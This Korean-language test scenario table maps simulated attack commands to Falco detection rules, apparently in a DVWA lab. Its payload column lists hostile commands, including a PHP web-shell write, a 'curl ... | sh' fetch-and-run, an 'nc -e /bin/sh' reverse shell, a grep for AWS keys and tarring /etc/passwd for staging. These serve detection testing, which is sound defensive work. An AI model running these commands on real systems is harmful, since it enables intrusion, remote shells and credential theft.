# Unit Test Scenario

| **#** | **테스트 이름** | **실행 명령어 (Payload)** | **검증하는 Falco 규칙 (Rule Name)** | **규칙 설명 (행위)** |
| --- | --- | --- | --- | --- |
| **SECTION 1** | **DVWA Artifact Rules** | **(업로드 경로 집중)** |  |  |
| 1 | 웹쉘 업로드 (`.php`) | `echo '<?php...?>' > .../uploads/shell.php` | `DVWA Upload Dir File WriteDVWA Upload Dir Suspicious Ext Written` | 업로드 폴더에 파일 쓰기 및위험 확장자(.php) 탐지 |
| 2 | 악성 아카이브 업로드 (`.zip`) | `touch .../uploads/malware.zip` | `DVWA Upload Dir Archive Written` | 업로드 폴더에 압축 파일(.zip) 생성 탐지 |
| 3 | 권한 변경 (`chmod`) | `chmod 777 .../uploads/shell.php` | `DVWA Upload Dir Chmod` | 업로드 폴더 내 파일 권한 변경 탐지 |
| 4 | 업로드 파일 실행 | `cat .../uploads/shell.php` | `DVWA Execute From Upload Dir` | 업로드 폴더 내 파일 실행/접근 시도 탐지 |
| 5 | 외부 도구 다운로드 (`wget`) | `wget -O .../uploads/hack.sh http://...` | `DVWA Download Tool Writes To Upload Dir` | `wget`/`curl`로 업로드 폴더에 파일 저장 탐지 |
| 6 | 파일 이동/이름변경 (`mv`) | `mv .../shell.php .../hidden_shell.php` | `DVWA upload dir file move` | 업로드 폴더 내에서 파일 이동/이름 변경 탐지 |
| 7 | 쉘 스포닝 (`whoami`) | `whoami` | `DVWA Webserver Spawns Shell` | 웹 서버 프로세스(apache/nginx)가 쉘(bash) 실행 탐지 |
| **SECTION 2** | **PRJ Exec Rules** | **(일반 런타임)** |  |  |
| 8 | 시스템 정찰 (`uname`, `ps`) | `uname -a; id; ps aux` | `PRJ Exec Recon` | 정찰 도구(`uname`, `id`, `ps` 등) 실행 탐지 |
| 9 | 자격 증명 검색 (`grep AWS_KEY`) | `grep -r 'AWS_ACCESS_KEY_ID' ...` | `PRJ Exec Credential Search` | 민감한 키워드(AWS Key, SSH Key 등) 검색 탐지 |
| 10 | 즉시 실행 (`curl | `curl http://... | sh` | `PRJ Exec Fetch And Run` |
| 11 | 임시 경로 실행 (`/tmp/ls`) | `cp /bin/ls /tmp/mal_ls && /tmp/mal_ls` | `PRJ Exec From Tmp Paths` | `/tmp` 또는 `/dev/shm` 경로에서 바이너리 실행 탐지 |
| 12 | 리버스 쉘 (`nc -e`) | `nc -e /bin/sh 127.0.0.1 4444` | `PRJ Exec Reverse Shell Tooling` | 리버스 쉘 연결 도구(`nc -e`, `bash -i` 등) 사용 탐지 |
| 13 | 데이터 압축 (tar) | `tar -czf /tmp/data.tar.gz /etc/passwd` | `PRJ Exec Archive/Staging` | 데이터 유출을 위한 압축 도구(`tar`, `zip` 등) 실행 탐지 |
| **SECTION 3** | **Post-Incident Forensics** | **(정밀 분석 및 포렌식)** |  |  |
| 14 | Malware (sample) | `samplexxx.malware_sample` |  |  |